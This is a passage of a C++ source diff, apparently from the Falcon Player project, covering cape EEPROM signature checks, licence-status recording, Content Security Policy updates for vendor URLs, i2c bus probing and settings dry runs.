+                            int f = open(newDevFile.c_str(), O_WRONLY);
+                            std::string newv = string_sprintf("%s", v.c_str());
+                            write(f, newv.c_str(), newv.size());
+                            close(f);
+                        }
+                    }
+                    if (validSignature && result.isMember("disableOutputs")) {
+                        disableOutputs(result["disableOutputs"]);
+                    }
+                    if (settingsChanged) {
+                        lines.push_back("BootActions = \"settings\"");
+                        writeSettingsFile(lines);
+                    }
+                    if (result.isMember("vendor")) {
+                        // A signature not bound to this hardware is reported to the
+                        // vendor from the browser as well as from the device, and
+                        // that request needs the vendor's host in connect-src as
+                        // well as img-src.  Nothing else does, so it is asked for
+                        // only in the state that uses it.
+                        processVendor(result["vendor"], capeStatus() == CapeUtils::CapeStatus::SIGNED_GENERIC);
+                    }
+                }
+                // Publish how this cape verified. The enum has always existed but
+                // never left C++, so the only way anything downstream could tell a
+                // signed cape from one whose signature verifies but is not attached
+                // to identifiable hardware was to infer it. Name it plainly instead.
+                CapeUtils::CapeStatus st = capeStatus();
+                result["capeStatus"] = capeStatusName(st);
+
+                // SIGNED_GENERIC means the signature verified but the EEPROM is not
+                // on an i2c bus and carries no device serial -- what a signed image
+                // lifted off the hardware it was licensed to looks like. A cape
+                // bought from the store is on a real EEPROM or is locked to a board
+                // and lands in SIGNED, so it never reaches here.
+                //
+                // Detection is recorded, not acted on. Cape detect runs from fppinit
+                // before networking exists (the unit is ordered Before= the network
+                // targets), so anything that tried to notify anyone from this point
+                // would fail on every boot -- and fail silently, which is worse than
+                // not trying. The record is what the notifier reads once there is a
+                // network; see the plan item for the two transports.
+                if (st == CapeUtils::CapeStatus::SIGNED_GENERIC) {
+                    result["licenseCheck"] = "signed-not-on-hardware";
+                    printf("CapeUtils: cape signature verifies but is not bound to this hardware "
+                           "(no i2c EEPROM, no device serial) -- recording for the vendor\n");
+                }
+
+                Json::StreamWriterBuilder wbuilder;
+                std::string resultStr = Json::writeString(wbuilder, result);
+                put_file_contents(outputPath + "/tmp/cape-info.json", (const uint8_t*)resultStr.c_str(), resultStr.size());
+                setFilePerms(outputPath + "/tmp/cape-info.json");
+            }
+            capeInfo = result;
+        } else {
+            printf("Did not find cape-info.json\n");
+        }
+
+        // if there are default configurations, copy them into place if they dont already exist
+        // unless forceDefaults is set, in which case overwrite with defaults from the new EEPROM image
+        if (!readOnly && (!hasSignature || validSignature)) {
+            std::vector<std::string> files;
+            getFileList(outputPath + "/tmp/defaults", "", files);
+            for (auto a : files) {
+                std::string src = outputPath + "/tmp/defaults" + a;
+                std::string target = "/home/fpp/media" + a;
+
+                if (target[target.length() - 1] == '/') {
+                    mkdir(target.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
+                } else {
+                    if (forceDefaults) {
+                        copyFile(src, target);
+                    } else {
+                        copyIfNotExist(src, target);
+                    }
+                    setOwnerGroup(target);
+                }
+            }
+        }
+        std::vector<std::string> files;
+        getFileList(outputPath + "/tmp/strings", "", files);
+        for (auto a : files) {
+            std::string src = outputPath + "/tmp/strings" + a;
+            Json::Value result;
+            Json::CharReaderBuilder factory;
+            std::string errors;
+            std::ifstream istream(src);
+            bool success = Json::parseFromStream(factory, istream, &result, &errors);
+            if (success) {
+                result["supportsSmartReceivers"] = validSignature;
+                Json::StreamWriterBuilder wbuilder;
+                std::string resultStr = Json::writeString(wbuilder, result);
+                put_file_contents(src, (const uint8_t*)resultStr.c_str(), resultStr.size());
+            }
+        }
+    }
+
+    bool checkAddURL(const std::string& url, Json::Value& csp) {
+        if (url.empty()) {
+            return false;
+        }
+        for (int x = 0; x < csp.size(); x++) {
+            if (csp[x].asString() == url) {
+                return false; // already exists
+            }
+        }
+        csp.append(url);
+        return true;
+    }
+    void processVendor(const Json::Value& vendor, bool allowConnect = false) {
+        std::string url = vendor.isMember("url") ? vendor["url"].asString() : "";
+        std::string imageUrl = vendor.isMember("image") ? vendor["image"].asString() : "";
+        if (!imageUrl.empty()) {
+            int idx = imageUrl.find("/", 9);
+            if (idx != std::string::npos) {
+                imageUrl = imageUrl.substr(0, idx + 1);
+            }
+            if (imageUrl == url) {
+                imageUrl = "";
+            }
+        }
+        Json::Value csp;
+        if (!LoadJsonFromFile("/home/fpp/media/config/csp_allowed_domains.json", csp, CapeJsonRoot::Object)) {
+            csp["default-src"] = Json::Value(Json::arrayValue);
+            csp["img-src"] = Json::Value(Json::arrayValue);
+            csp["script-src"] = Json::Value(Json::arrayValue);
+            csp["style-src"] = Json::Value(Json::arrayValue);
+            csp["connect-src"] = Json::Value(Json::arrayValue);
+            csp["object-src"] = Json::Value(Json::arrayValue);
+        }
+        // Both, not `||`: short-circuiting meant that whenever the site URL was
+        // new the logo URL was skipped, and only picked up on a later boot.
+        bool changed = checkAddURL(url, csp["img-src"]);
+        changed = checkAddURL(imageUrl, csp["img-src"]) || changed;
+        if (allowConnect) {
+            changed = checkAddURL(url, csp["connect-src"]) || changed;
+            changed = checkAddURL(imageUrl, csp["connect-src"]) || changed;
+        }
+        if (changed) {
+            Json::StreamWriterBuilder wbuilder;
+            std::string resultStr = Json::writeString(wbuilder, csp);
+            put_file_contents("/home/fpp/media/config/csp_allowed_domains.json", (const uint8_t*)resultStr.c_str(), resultStr.size());
+            setFilePerms("/home/fpp/media/config/csp_allowed_domains.json");
+            exec("/opt/fpp/scripts/ManageApacheContentPolicy.sh regenerate-norestart");
+        }
+    }
+
+    bool waitForI2CBus(int i2cBus) {
+        char buf[256];
+        snprintf(buf, sizeof(buf), "/sys/bus/i2c/devices/i2c-%d/new_device", i2cBus);
+
+        bool has0 = access("/sys/bus/i2c/devices/i2c-0/new_device", F_OK) != -1;
+
+        // wait for up to 15 seconds for the i2c bus to appear
+        // if it's already there, this should be nearly immediate
+        for (int x = 0; x < 1500; x++) {
+            if (access(buf, F_OK) != -1) {
+                return true;
+            }
+
+            // after 1/10 of a second, if there is a 0 bus, then it's likely
+            // that the wanted bus won't exist
+            if (x > 100 && has0) {
+                return false;
+            }
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        }
+        return false;
+    }
+
+    // The bus the EEPROM was found on during this boot's cape detection, or -1 if
+    // it hasn't been located yet. findCapeEEPROM() records it after a successful
+    // read; /home/fpp/media/tmp is wiped at boot, so a stale answer can't survive
+    // into the next one.
+    int recordedEEPROMBus() {
+        // get_file_contents() does not survive a missing file
+        if (!file_exists("/home/fpp/media/tmp/eeprom_location.txt")) {
+            return -1;
+        }
+        int len = 0;
+        char* data = (char*)get_file_contents("/home/fpp/media/tmp/eeprom_location.txt", len);
+        std::string loc(data, len);
+        free(data);
+
+        // "/sys/bus/i2c/devices/<bus>-0050/eeprom"
+        static const std::string PREFIX = "/sys/bus/i2c/devices/";
+        if (loc.compare(0, PREFIX.size(), PREFIX) != 0) {
+            return -1;
+        }
+        size_t dash = loc.find('-', PREFIX.size());
+        if (dash == std::string::npos) {
+            return -1;
+        }
+        // Length-capped so std::stoi cannot throw: findCapeEEPROM() runs outside
+        // the constructor's try block, so an out_of_range here would escape
+        // CapeInfo entirely rather than degrade to "no cape".
+        std::string busStr = loc.substr(PREFIX.size(), dash - PREFIX.size());
+        if (busStr.empty() || busStr.size() > 4 || busStr.find_first_not_of("0123456789") != std::string::npos) {
+            return -1;
+        }
+        return std::stoi(busStr);
+    }
+
+    // A device that isn't answering yet is not the same as a device that isn't
+    // there, and the difference matters: a single missed probe on i2c2 sends us
+    // to i2c1, which on the BBB steals P9_17/P9_18 from whatever the cape put
+    // there. The pads for a bus are often re-muxed microseconds earlier (see
+    // findCapeEEPROM), and the lines still have to charge through their pull-ups
+    // before anyone will ACK -- so give a "missing" device retryMS to show up
+    // before believing it. retryMS=0 keeps the old single-shot behaviour for
+    // callers that are only confirming a device already known to be there.
+    bool HasI2CDevice(int i, int i2cBus, int retryMS = 0) {
+        char buf[256];
+        snprintf(buf, sizeof(buf), "i2cdetect -y -r %d 0x%X 0x%X", i2cBus, i, i);
+        int waited = 0;
+        while (true) {
+            std::string result = exec(buf);
+            if (result != "" && result.find("--") == std::string::npos) {
+                if (waited) {
+                    printf("Found 0x%X on i2c%d after %dms\n", i, i2cBus, waited);
+                }
+                return true;
+            }
+            if (waited >= retryMS) {
+                return false;
+            }
+            std::this_thread::sleep_for(std::chrono::milliseconds(50));
+            waited += 50;
+        }
+    }
+    std::string checkUnsupported(const std::string& orig, int i2cbus) {
+        return orig;
+    }
+
+    std::string mapV5Config(const std::string& orig) {
+        std::string stringsConfigFile = "";
+        std::string platformDir = "/opt/fpp/capes/" + getPlatformCapeDir();
+#if defined(PLATFORM_BBB) || defined(PLATFORM_BB64)
+        stringsConfigFile = "/home/fpp/media/config/co-bbbStrings.json";
+#elif defined(PLATFORM_PI)
+        stringsConfigFile = "/home/fpp/media/config/co-pixelStrings.json";
+#endif
+        if (file_exists(stringsConfigFile)) {
+            Json::Value root;
+            if (LoadJsonFromFile(stringsConfigFile, root, CapeJsonRoot::Object)) {
+                if (root["channelOutputs"][0]["enabled"].asInt()) {
+                    std::string type = root["channelOutputs"][0]["type"].asString();
+                    std::string subtype = root["channelOutputs"][0]["subType"].asString();
+                    std::string pinout = "1.x";
+                    if (root["channelOutputs"][0].isMember("pinoutVersion")) {
+                        pinout = root["channelOutputs"][0]["pinoutVersion"].asString();
+                    }
+                    std::string key = type + ":" + subtype;
+                    std::string newEeprom = CONFIG_EEPROM_UPGRADE_MAP[key];
+                    if (pinout == "2.x") {
+                        newEeprom += "v2";
+                    }
+                    if (readOnly) {
+                        // installing it is the boot-time run's job; a read-only
+                        // probe used to install it here and then switch itself
+                        // to read-write for the rest of the run
+                        printf("Not installing a virtual eeprom for %s from a read-only probe\n", newEeprom.c_str());
+                    } else if (file_exists(platformDir + "/" + newEeprom + "-eeprom.bin")) {
+                        // found a virtual eeprom, install it and use it
+                        printf("Installing new virtual eeprom based on prior string configuration: %s\n", newEeprom.c_str());
+                        newEeprom = platformDir + "/" + newEeprom + "-eeprom.bin";
+                        copyFile(newEeprom, "/home/fpp/media/config/cape-eeprom.bin");
+                        setFilePerms("/home/fpp/media/config/cape-eeprom.bin");
+                        return "/home/fpp/media/config/cape-eeprom.bin";
+                    }
+                }
+            }
+        }
+        return orig;
+    }
+    void readSettingsFile(std::vector<std::string>& lines) {
+        std::string line;
+        std::ifstream settingsIstream("/home/fpp/media/settings");
+        if (settingsIstream.good()) {
+            while (std::getline(settingsIstream, line)) {
+                if (line.size() > 0) {
+                    lines.push_back(line);
+                }
+            }
+        }
+        settingsIstream.close();
+    }
+    void writeSettingsFile(const std::vector<std::string>& lines) {
+        std::ofstream settingsOstream("/home/fpp/media/settings");
+        for (auto l : lines) {
+            settingsOstream << l << "\n";
+        }
+        settingsOstream.close();
+    }
+    void getFileList(const std::string& basepath, const std::string& path, std::vector<std::string>& files) {
+        // Archives from the EEPROM are extracted here, and tar and unzip both
+        // restore symlinks: following one would recurse forever (a link to
+        // "..") or copy whatever it points at into the media directory.
+        // Only plain files and directories are taken.
+        struct stat st;
+        if (lstat(basepath.c_str(), &st) != 0 || !(S_ISDIR(st.st_mode) || S_ISREG(st.st_mode))) {
+            return;
+        }
+        DIR* dir = opendir(basepath.c_str());
+        if (dir) {
+            files.push_back(path + "/");
+            struct dirent* ep;
+            while ((ep = readdir(dir))) {
+                std::string v = ep->d_name;
+                if (v != "." && v != "..") {
+                    std::string newBPath = basepath + "/" + v;
+                    std::string newPath = path + "/" + v;
+                    getFileList(newBPath, newPath, files);
+                }
+            }
+            closedir(dir);
+        } else if (file_exists(basepath)) {
+            files.push_back(path);
+        }
+    }
+    void DoSignatureVerify(FILE* file, const std::string& fKeyId, const std::string& path, bool& validSignature, uint8_t* signature, int sigLen) {
+        uint8_t* b = new uint8_t[32768];
+        size_t pos = ftell(file);
+        int flen = read_section_length(file);
+        while (flen != 0) {
+            int flag = std::stoi(read_string(file, 2));
+            if (flag < 50) {
+                flen += 64;
+            }
+            fseek(file, flen, SEEK_CUR);
+            flen = read_section_length(file);
+        }
+        int end = ftell(file);
+        if (end < (int)pos || end - (int)pos > MAX_EEPROM_SIZE) {
+            delete[] b;
+            throw std::runtime_error("signed EEPROM content larger than an EEPROM");
+        }
+        fseek(file, pos, SEEK_SET);
+        int len = fread(b, 1, end - pos, file);
+        fseek(file, pos, SEEK_SET);
+
+        const uint8_t* key = KEYS[fKeyId].first;
+        size_t keyLen = KEYS[fKeyId].second;
+
+        EVP_PKEY* pubKey = NULL;
+        OSSL_DECODER_CTX* ctx = OSSL_DECODER_CTX_new_for_pkey(&pubKey, "PEM", nullptr,
+                                                              "EC",
+                                                              0,
+                                                              NULL, NULL);
+        if (OSSL_DECODER_from_data(ctx, &key, &keyLen) == 0) {
+            OSSL_DECODER_CTX_free(ctx);
+            validSignature = 0;
+            delete[] b;
+            return;
+        }
+        OSSL_DECODER_CTX_free(ctx);
+
+        EVP_MD_CTX* m_VerifyCtx = EVP_MD_CTX_create();
+        EVP_DigestVerifyInit(m_VerifyCtx, NULL, EVP_sha256(), NULL, pubKey);
+        EVP_DigestVerifyUpdate(m_VerifyCtx, b, len);
+        int AuthStatus = EVP_DigestVerifyFinal(m_VerifyCtx, signature, sigLen);
+        EVP_MD_CTX_free(m_VerifyCtx);
+        EVP_PKEY_free(pubKey);
+        validSignature = AuthStatus == 1;
+        delete[] b;
+    }
+
+    bool readOnly;
+    bool forceDefaults;
+    int bus;
+    std::string EEPROM;
+    std::string ORIGEEPROM;
+    std::string outputPath;
+
+    std::string cape;
+    std::string capev;
+    std::string capesn;
+    std::string devsn;
+
+    std::string fkeyId;
+    std::map<std::string, std::vector<std::string>> extras;
+    std::map<std::string, std::vector<std::string>> signedExtras;
+    bool validSignature = false;
+    bool hasSignature = false;
+    bool validEpromLocation = true;
+    bool corruptEEPROM = false;
+
+    std::map<std::string, std::vector<uint8_t>> fileMap;
+    Json::Value capeInfo;
+};
+
+CapeUtils CapeUtils::INSTANCE;
+CapeUtils::CapeUtils() :
+    capeInfo(nullptr) {
+}
+CapeUtils::~CapeUtils() {
+    if (capeInfo) {
+        delete capeInfo;
+    }
+}
+CapeInfo* CapeUtils::initCapeInfo(bool ro, bool forceDefaults) {
+    if (capeInfo == nullptr) {
+        capeInfo = new CapeInfo(ro, forceDefaults);
+    }
+    return capeInfo;
+}
+
+CapeUtils::CapeStatus CapeUtils::initCape(bool readOnly, bool forceDefaults) {
+    return initCapeInfo(readOnly, forceDefaults)->capeStatus();
+}
+
+std::string CapeUtils::dryRunSettings(const std::string& jurisdiction) {
+    // Read-only construction already writes nothing -- no settings file, no boot
+    // config, no file copies, no CSP changes -- so the dry run is that path plus
+    // the defaultSettings evaluation the read-only path skips.
+    g_jurisdictionOverride = jurisdiction;
+    const Json::Value& info = initCapeInfo(true)->getCapeInfo();
+
+    std::vector<std::string> lines;
+    {
+        std::string line;
+        std::ifstream in("/home/fpp/media/settings");
+        while (std::getline(in, line)) {
+            if (!line.empty()) {
+                lines.push_back(line);
+            }
+        }
+    }
+    bool strict = priorOptInRequired(lines);
+
+    Json::Value out(Json::objectValue);
+    Json::Value settings(Json::objectValue);
+    Json::Value refused(Json::objectValue);
+    if (info.isMember("defaultSettings")) {
+        for (const auto& key : info["defaultSettings"].getMemberNames()) {
+            std::string value = info["defaultSettings"][key].asString();
+            std::string why;
+            // The same predicate a real run uses. Anything the user has already
+            // set is refused here exactly as it would be there, which is why a
+            // non-privacy default applied at boot does not come back: it is set.
+            switch (capeMaySetSetting(lines, key, value, strict, why)) {
+            case CapeSettingAction::Apply:
+                settings[key] = value;
+                break;
+            case CapeSettingAction::Refuse:
+                refused[key] = why;
+                break;
+            case CapeSettingAction::SkipUnchanged:
+                // Neither proposed nor refused: the box already holds exactly this
+                // value, so the wizard has nothing to offer and nothing to explain.
+                break;
+            }
+        }
+    }
+    out["jurisdiction"] = jurisdiction;
+    out["priorOptIn"] = strict;
+    out["settings"] = settings;
+    out["refused"] = refused;
+
+    g_jurisdictionOverride.clear();
+
+    // Compact, single line, and printed last. Cape detection writes progress to
+    // stdout throughout -- signature results, extracted files -- so a
+    // pretty-printed object would be interleaved with it and unparseable. One
+    // line means the caller can take the last non-empty line of output and be
+    // done, which is what the wizard's PHP wrapper does.
+    Json::StreamWriterBuilder wbuilder;
+    wbuilder["indentation"] = "";
+    return Json::writeString(wbuilder, out);
+}
+
+bool CapeUtils::hasFile(const std::string& path) {
+    return initCapeInfo(true)->hasFile(path);
+}
+std::vector<uint8_t> CapeUtils::getFile(const std::string& path) {
+    return initCapeInfo(true)->getFile(path);
+}
+const Json::Value& CapeUtils::getCapeInfo() {
+    static Json::Value val;
+    initCapeInfo(true);
+    val = capeInfo->getCapeInfo();
+    return val;
+}
+
+int CapeUtils::getLicensedOutputs() {
+    return initCapeInfo(true)->getLicensedOutputs();
+}
+
+std::string CapeUtils::getKeyId() {
+    return initCapeInfo(true)->getKeyId();
+}
+
+bool CapeUtils::getStringConfig(const std::string& type, Json::Value& val) {
+    Json::Value result;
+    Json::CharReaderBuilder factory;
+    std::string errors;
+
+    std::string fn = "/tmp/strings/" + type + ".json";
+    if (hasFile(fn)) {
+        const std::vector<uint8_t>& f = getFile(fn);
+        std::istringstream istream(std::string((const char*)&f[0], f.size()));
+        bool success = Json::parseFromStream(factory, istream, &val, &errors);
+        if (success) {
+            val["supportsSmartReceivers"] = capeInfo->capeStatus() >= CapeUtils::CapeStatus::SIGNED_GENERIC;
+            return true;
+        }
+    } else {
+        fn = "/opt/fpp/capes/";
+        fn += getPlatformCapeDir();
+        fn += "/strings/" + type + ".json";
+        if (file_exists(fn)) {
+            std::ifstream istream(fn);
+            bool success = Json::parseFromStream(factory, istream, &val, &errors);
+            if (success) {
+                if (capeInfo->capeStatus() <= CapeUtils::CapeStatus::UNSIGNED) {
+                    val["supportsSmartReceivers"] = false;
+                }
+                return true;
+            }
+        }
+    }
+    return false;
+}
+
+bool CapeUtils::getPWMConfig(const std::string& type, Json::Value& val) {
+    Json::Value result;
+    Json::CharReaderBuilder factory;
+    std::string errors;
+
+    std::string fn = "/tmp/pwm/" + type + ".json";
+    if (hasFile(fn) && getLicensedOutputs() > 0) {
+        const std::vector<uint8_t>& f = getFile(fn);
+        std::istringstream istream(std::string((const char*)&f[0], f.size()));
+        bool success = Json::parseFromStream(factory, istream, &val, &errors);
+        if (success) {
+            return true;
+        }
+    }
+    return false;
+}
+
+bool CapeUtils::getPanelConfig(const std::string& type, Json::Value& val) {
+    Json::Value result;
+    Json::CharReaderBuilder factory;
+    std::string errors;
+
+    std::string fn = "/tmp/panels/" + type + ".json";
+    if (hasFile(fn)) {
+        const std::vector<uint8_t>& f = getFile(fn);
+        std::istringstream istream(std::string((const char*)&f[0], f.size()));
+        return Json::parseFromStream(factory, istream, &val, &errors);
+    }
+    return false;
+}
